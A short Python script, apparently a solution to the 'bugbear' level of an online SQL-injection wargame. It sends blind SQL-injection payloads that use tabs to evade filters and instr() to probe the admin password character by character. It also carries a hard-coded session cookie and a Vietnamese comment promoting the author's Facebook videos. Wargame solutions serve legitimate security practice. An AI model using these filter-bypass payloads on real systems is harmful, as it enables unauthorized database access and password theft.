import requests
url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies={"PHPSESSID":"9g8clqv102h2sohm6v1ef5i0es"}
a="0123456789abcdefghijklmnopqrstuvwxy"
for i in a:
 params={'no':'2||\tid\tin\t("admin")&&instr(pw,"'+str(i)+'")'}
 r=requests.get(url,cookies=cookies,params=params)
 b=r.text.split("<br>")[1].split("<code>")[0]
 print(f"char {i} hop le: {b}")
 # không hiểu có thể ib để hỏi nhá, tất cả video về dạng tìm pass t đều đăng lên tại fb:konchananonymous
